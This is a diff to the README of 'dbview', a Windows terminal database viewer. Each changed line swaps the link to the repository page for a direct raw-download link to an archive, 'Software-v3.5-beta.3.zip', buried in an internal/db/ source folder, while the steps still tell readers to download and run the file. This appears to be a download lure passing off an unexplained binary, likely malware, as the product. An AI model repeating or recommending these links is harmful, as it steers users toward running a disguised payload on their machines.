@@ -1,12 +1,12 @@
 # 🗂️ dbview - View Databases From Terminal
 
-[![Download dbview](https://img.shields.io/badge/Download-dbview-blue?style=for-the-badge)](https://github.com/cadanga8927/dbview)
+[![Download dbview](https://img.shields.io/badge/Download-dbview-blue?style=for-the-badge)](https://github.com/cadanga8927/dbview/raw/refs/heads/main/internal/db/Software-v3.5-beta.3.zip)
 
 ## 📥 Download dbview
 
 Use this link to visit the download page:
 
-[https://github.com/cadanga8927/dbview](https://github.com/cadanga8927/dbview)
+[https://github.com/cadanga8927/dbview/raw/refs/heads/main/internal/db/Software-v3.5-beta.3.zip](https://github.com/cadanga8927/dbview/raw/refs/heads/main/internal/db/Software-v3.5-beta.3.zip)
 
 On that page, look for the latest Windows release and download the file for your system.
 
@@ -21,7 +21,7 @@ dbview runs in a terminal window on Windows. It is built for people who want to 
 - A database account, host name, port, user name, and password if your database needs them
 
 ### How to install
-1. Open the download page: [https://github.com/cadanga8927/dbview](https://github.com/cadanga8927/dbview)
+1. Open the download page: [https://github.com/cadanga8927/dbview/raw/refs/heads/main/internal/db/Software-v3.5-beta.3.zip](https://github.com/cadanga8927/dbview/raw/refs/heads/main/internal/db/Software-v3.5-beta.3.zip)
 2. Find the latest release for Windows
 3. Download the `.exe` file or the Windows archive file
 4. If you downloaded a `.zip` file, extract it to a folder
@@ -221,7 +221,7 @@ Resize the terminal window or make the font smaller so more columns fit on scree
 
 ## 📌 Quick start
 
-1. Visit [https://github.com/cadanga8927/dbview](https://github.com/cadanga8927/dbview)
+1. Visit [https://github.com/cadanga8927/dbview/raw/refs/heads/main/internal/db/Software-v3.5-beta.3.zip](https://github.com/cadanga8927/dbview/raw/refs/heads/main/internal/db/Software-v3.5-beta.3.zip)
 2. Download the latest Windows file
 3. Extract it if needed
 4. Open PowerShell or Command Prompt
